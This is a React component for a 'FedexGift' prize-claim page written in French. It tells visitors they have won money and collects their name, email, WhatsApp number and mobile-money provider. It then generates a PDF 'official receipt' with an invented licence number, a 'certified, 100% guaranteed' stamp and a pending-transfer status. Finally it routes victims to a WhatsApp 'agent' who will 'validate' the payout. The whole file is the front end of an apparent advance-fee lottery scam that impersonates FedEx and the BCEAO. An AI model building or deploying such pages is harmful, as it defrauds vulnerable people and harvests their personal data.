"use client";

import React, { useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Download, MessageSquare, CheckCircle2, ShieldAlert, CreditCard, User, Mail, Phone, Lock, Sparkles } from "lucide-react";
import { jsPDF } from "jspdf";

interface ClaimFormProps {
  winningPrize: number;
}

const COUNTRY_CODES = [
  { code: "+225", label: "Côte d'Ivoire 🇨🇮" },
  { code: "+221", label: "Sénégal 🇸🇳" },
  { code: "+237", label: "Cameroun 🇨🇲" },
  { code: "+228", label: "Togo 🇹🇬" },
  { code: "+226", label: "Burkina Faso 🇧🇫" },
  { code: "+229", label: "Bénin 🇧🇯" },
  { code: "+242", label: "Congo 🇨🇬" },
];

const PAYMENT_METHODS = [
  { id: "mtn", name: "MTN Mobile Money", icon: "🟡" },
  { id: "orange", name: "Orange Money", icon: "🟠" },
  { id: "wave", name: "Wave Money", icon: "🔵" },
  { id: "moov", name: "Moov Money", icon: "🟢" },
];

// Admin WhatsApp Number (can be updated by user as needed)
const ADMIN_WHATSAPP_NUMBER = "22990000000";

export default function ClaimForm({ winningPrize }: ClaimFormProps) {
  const [nom, setNom] = useState("");
  const [email, setEmail] = useState("");
  const [countryCode, setCountryCode] = useState("+225");
  const [phone, setPhone] = useState("");
  const [paymentMethod, setPaymentMethod] = useState("mtn");
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [pdfGenerated, setPdfGenerated] = useState(false);
  const [transactionId, setTransactionId] = useState("");

  const handleFormSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    if (!nom.trim() || !email.trim() || !phone.trim()) {
      alert("Veuillez remplir tous les champs obligatoires (*)");
      return;
    }

    // Generate unique transaction reference
    const refId = "FDZ-" + Math.random().toString(36).substring(2, 9).toUpperCase() + "-" + Date.now().toString().slice(-4);
    setTransactionId(refId);

    // Generate PDF receipt with jsPDF
    generatePDFReceipt(refId);

    setIsSubmitted(true);
    setPdfGenerated(true);
  };

  const generatePDFReceipt = (refId: string) => {
    const doc = new jsPDF({
      orientation: "portrait",
      unit: "mm",
      format: "a4",
    });

    const currentDate = new Date().toLocaleDateString("fr-FR", {
      day: "2-digit",
      month: "2-digit",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    });

    // Dark luxury theme colors
    doc.setFillColor(15, 23, 42); // slate 900 background header
    doc.rect(0, 0, 210, 45, "F");

    // Header Title
    doc.setTextColor(255, 215, 0); // Gold
    doc.setFont("helvetica", "bold");
    doc.setFontSize(24);
    doc.text("FedexGift", 105, 20, { align: "center" });

    doc.setFontSize(11);
    doc.setTextColor(255, 255, 255);
    doc.text("REÇU OFFICIEL DE GAIN ET TRANSFERT DE FONDS", 105, 28, { align: "center" });

    doc.setFontSize(9);
    doc.setTextColor(200, 200, 200);
    doc.text("Licence Internationale N° FS-88492026-BCEAO", 105, 35, { align: "center" });

    // Gold decorative bar
    doc.setFillColor(255, 215, 0);
    doc.rect(0, 43, 210, 2, "F");

    // Body Container Frame
    doc.setDrawColor(255, 215, 0);
    doc.setLineWidth(0.8);
    doc.rect(15, 55, 180, 215);

    // Transaction Metadata Box
    doc.setFillColor(248, 250, 252);
    doc.rect(20, 62, 170, 25, "F");

    doc.setFontSize(10);
    doc.setTextColor(51, 65, 85);
    doc.text(`RÉFÉRENCE TRANSACTION :`, 25, 71);
    doc.setFont("helvetica", "bold");
    doc.setTextColor(185, 28, 28);
    doc.text(refId, 85, 71);

    doc.setFont("helvetica", "normal");
    doc.setTextColor(51, 65, 85);
    doc.text(`DATE ET HEURE DE EMISSION :`, 25, 80);
    doc.setFont("helvetica", "bold");
    doc.setTextColor(15, 23, 42);
    doc.text(currentDate, 85, 80);

    // Winner Info Table
    doc.setFontSize(13);
    doc.setFont("helvetica", "bold");
    doc.setTextColor(15, 23, 42);
    doc.text("INFORMATIONS DU GAGNANT", 25, 98);

    doc.setDrawColor(226, 232, 240);
    doc.line(25, 101, 185, 101);

    doc.setFontSize(10);
    doc.setFont("helvetica", "normal");
    
    // Rows
    const rows = [
      ["Nom & Prénom :", nom],
      ["Adresse Email :", email],
      ["Numéro WhatsApp :", `${countryCode} ${phone}`],
      ["Mode de Paiement :", PAYMENT_METHODS.find((p) => p.id === paymentMethod)?.name || "Mobile Money"],
      ["Statut du Virement :", "EN ATTENTE DE VALIDATION FINAL WHATSAPP"],
    ];

    let startY = 110;
    rows.forEach(([label, value]) => {
      doc.setTextColor(100, 116, 139);
      doc.text(label, 25, startY);
      doc.setFont("helvetica", "bold");
      doc.setTextColor(15, 23, 42);
      doc.text(value, 80, startY);
      doc.setFont("helvetica", "normal");
      startY += 10;
    });

    // Winning Prize Box
    doc.setFillColor(254, 242, 242);
    doc.setDrawColor(239, 68, 68);
    doc.rect(25, startY + 5, 160, 30, "FD");

    doc.setFontSize(12);
    doc.setTextColor(185, 28, 28);
    doc.setFont("helvetica", "bold");
    doc.text("MONTANT NET DU GAIN GAGNÉ :", 105, startY + 16, { align: "center" });

    doc.setFontSize(22);
    doc.setTextColor(22, 163, 74);
    doc.text(`${winningPrize.toLocaleString("fr-FR")} FCFA`, 105, startY + 28, { align: "center" });

    // Official Certification Stamp
    doc.setDrawColor(22, 163, 74);
    doc.setLineWidth(1.5);
    doc.rect(130, startY + 45, 55, 22);
    doc.setFontSize(9);
    doc.setTextColor(22, 163, 74);
    doc.setFont("helvetica", "bold");
    doc.text("FedexGift", 157.5, startY + 52, { align: "center" });
    doc.text("APPROUVÉ & CERTIFIÉ", 157.5, startY + 58, { align: "center" });
    doc.text("100% GARANTI", 157.5, startY + 63, { align: "center" });

    // Security & Instructions Footer
    doc.setFontSize(9);
    doc.setFont("helvetica", "italic");
    doc.setTextColor(100, 116, 139);
    doc.text("Instructions importantes : Veuillez présenter ce reçu à notre agent WhatsApp pour débloquer", 25, startY + 75);
    doc.text("votre virement sur votre compte Mobile Money dans les plus brefs délais.", 25, startY + 80);

    // Save File
    doc.save(`recu_gain_fedex_gift_${refId}.pdf`);
  };

  const getWhatsAppLink = () => {
    const fullPhone = `${countryCode}${phone}`;
    const selectedPayName = PAYMENT_METHODS.find((p) => p.id === paymentMethod)?.name || "Mobile Money";
    const message = `Bonjour FedexGift, je viens de gagner ${winningPrize.toLocaleString("fr-FR")} FCFA sur le site !

Nom: ${nom}
Email: ${email}
Téléphone: ${fullPhone}
Moyen de paiement: ${selectedPayName}
Réf Reçu: ${transactionId}

Voici mon reçu PDF téléchargé. Merci de valider mon transfert !`;

    return `https://wa.me/${ADMIN_WHATSAPP_NUMBER}?text=${encodeURIComponent(message)}`;
  };

  return (
    <section id="claim-form-section" className="py-12 px-4 max-w-2xl mx-auto">
      <div className="glass-card rounded-3xl p-6 sm:p-10 gold-border-glow shadow-2xl bg-gradient-to-b from-brandDark-800 via-brandDark-900 to-brandDark-900">
        
        {/* Section Header */}
        <div className="text-center mb-8 space-y-2">
          <div className="inline-flex items-center gap-2 bg-yellow-500/10 border border-yellow-500/40 text-yellow-300 px-3 py-1 rounded-full text-xs font-bold uppercase">
            <Lock className="w-3.5 h-3.5 text-green-400" />
            Formulaire Officiel de Réclamation
          </div>

          <h2 className="text-2xl sm:text-3xl font-display font-black text-white">
            RECEVEZ VOS <span className="text-gold-gradient">{winningPrize.toLocaleString("fr-FR")} FCFA</span>
          </h2>
          <p className="text-xs sm:text-sm text-gray-300">
            Remplissez vos informations exactes pour recevoir votre virement immédiat.
          </p>
        </div>

        {!isSubmitted ? (
          /* FORMULARIE */
          <form onSubmit={handleFormSubmit} className="space-y-5">
            {/* Nom & Prénom */}
            <div>
              <label className="block text-xs font-bold text-gray-300 uppercase tracking-wider mb-2 flex items-center gap-1.5">
                <User className="w-4 h-4 text-yellow-400" />
                Nom et Prénom *
              </label>
              <input
                type="text"
                required
                value={nom}
                onChange={(e) => setNom(e.target.value)}
                placeholder="Ex: Marc Koffi"
                className="w-full bg-brandDark-700/80 border border-gray-700 focus:border-yellow-400 rounded-xl px-4 py-3.5 text-white placeholder-gray-500 text-sm focus:outline-none transition shadow-inner"
              />
            </div>

            {/* Email */}
            <div>
              <label className="block text-xs font-bold text-gray-300 uppercase tracking-wider mb-2 flex items-center gap-1.5">
                <Mail className="w-4 h-4 text-yellow-400" />
                Adresse Email *
              </label>
              <input
                type="email"
                required
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Ex: marc.koffi@gmail.com"
                className="w-full bg-brandDark-700/80 border border-gray-700 focus:border-yellow-400 rounded-xl px-4 py-3.5 text-white placeholder-gray-500 text-sm focus:outline-none transition shadow-inner"
              />
            </div>

            {/* Téléphone WhatsApp with Indicatif */}
            <div>
              <label className="block text-xs font-bold text-gray-300 uppercase tracking-wider mb-2 flex items-center gap-1.5">
                <Phone className="w-4 h-4 text-green-400" />
                Téléphone WhatsApp *
              </label>
              <div className="flex gap-2">
                <select
                  value={countryCode}
                  onChange={(e) => setCountryCode(e.target.value)}
                  className="bg-brandDark-700/90 border border-gray-700 focus:border-yellow-400 rounded-xl px-3 py-3.5 text-yellow-300 font-bold text-sm focus:outline-none shadow-inner"
                >
                  {COUNTRY_CODES.map((c) => (
                    <option key={c.code} value={c.code} className="bg-brandDark-900 text-white">
                      {c.code} {c.label}
                    </option>
                  ))}
                </select>
                <input
                  type="tel"
                  required
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                  placeholder="07 08 09 10 11"
                  className="flex-1 bg-brandDark-700/80 border border-gray-700 focus:border-yellow-400 rounded-xl px-4 py-3.5 text-white placeholder-gray-500 text-sm focus:outline-none transition shadow-inner"
                />
              </div>
            </div>

            {/* Payment Method Selector */}
            <div>
              <label className="block text-xs font-bold text-gray-300 uppercase tracking-wider mb-2 flex items-center gap-1.5">
                <CreditCard className="w-4 h-4 text-yellow-400" />
                Moyen de Paiement Pour le Virement *
              </label>
              <div className="grid grid-cols-2 gap-2.5">
                {PAYMENT_METHODS.map((pm) => (
                  <button
                    key={pm.id}
                    type="button"
                    onClick={() => setPaymentMethod(pm.id)}
                    className={`p-3 rounded-xl border text-xs sm:text-sm font-bold flex items-center gap-2 transition text-left ${
                      paymentMethod === pm.id
                        ? "bg-yellow-500/20 border-yellow-400 text-yellow-300 shadow-md"
                        : "bg-brandDark-700/50 border-gray-800 text-gray-400 hover:border-gray-600"
                    }`}
                  >
                    <span className="text-lg">{pm.icon}</span>
                    <span>{pm.name}</span>
                  </button>
                ))}
              </div>
            </div>

            {/* Submit Button */}
            <motion.button
              whileHover={{ scale: 1.02 }}
              whileTap={{ scale: 0.98 }}
              type="submit"
              className="w-full py-4 bg-gradient-to-r from-red-600 via-red-700 to-red-600 hover:from-red-500 hover:to-red-600 text-white font-black text-lg rounded-2xl shadow-xl shadow-red-600/50 border border-yellow-400 flex items-center justify-center gap-2 cursor-pointer mt-4"
            >
              <Sparkles className="w-5 h-5 text-yellow-300 animate-spin" />
              <span>GÉNÉRER MON REÇU PDF & VALIDER</span>
            </motion.button>
          </form>
        ) : (
          /* SUCCESS STATE - PDF READY & WHATSAPP REDIRECT */
          <motion.div
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            className="space-y-6 text-center"
          >
            <div className="w-16 h-16 mx-auto rounded-full bg-green-500/20 border-2 border-green-400 flex items-center justify-center">
              <CheckCircle2 className="w-10 h-10 text-green-400" />
            </div>

            <div>
              <h3 className="text-xl sm:text-2xl font-black text-white mb-1">
                REÇU GÉNÉRÉ AVEC SUCCÈS !
              </h3>
              <p className="text-xs text-gray-300">
                Réf: <span className="text-yellow-400 font-mono font-bold">{transactionId}</span>
              </p>
            </div>

            <div className="bg-yellow-500/10 border border-yellow-500/30 rounded-2xl p-4 text-left space-y-2">
              <div className="flex items-center gap-2 text-yellow-300 font-bold text-xs">
                <Download className="w-4 h-4 text-yellow-400 animate-bounce" />
                1. Reçu téléchargé dans votre téléphone : <span className="underline">recu_gain_fedex_gift.pdf</span>
              </div>
              <div className="flex items-center gap-2 text-green-400 font-bold text-xs">
                <MessageSquare className="w-4 h-4 text-green-400" />
                2. Cliquez ci-dessous pour l'envoyer à l'agent et recevoir votre virement.
              </div>
            </div>

            {/* Re-Download PDF Button if needed */}
            <button
              onClick={() => generatePDFReceipt(transactionId)}
              className="text-xs text-yellow-300/80 hover:text-yellow-300 underline flex items-center justify-center gap-1 mx-auto"
            >
              <Download className="w-3.5 h-3.5" /> Re-télécharger mon reçu PDF
            </button>

            {/* Green WhatsApp Action Button */}
            <a
              href={getWhatsAppLink()}
              target="_blank"
              rel="noopener noreferrer"
              className="w-full py-4 bg-[#25D366] hover:bg-[#20ba5a] text-white font-black text-lg sm:text-xl rounded-2xl shadow-xl shadow-[#25D366]/40 flex items-center justify-center gap-3 border-2 border-white cursor-pointer transition-all block text-center"
            >
              <MessageSquare className="w-6 h-6 fill-white" />
              <span>FINALISER SUR WHATSAPP</span>
            </a>

            <p className="text-[10px] text-gray-400 flex items-center justify-center gap-1">
              <ShieldAlert className="w-3.5 h-3.5 text-yellow-400" />
              Service Client WhatsApp Officiel FedexGift - Réponse en 2h max
            </p>
          </motion.div>
        )}
      </div>
    </section>
  );
}
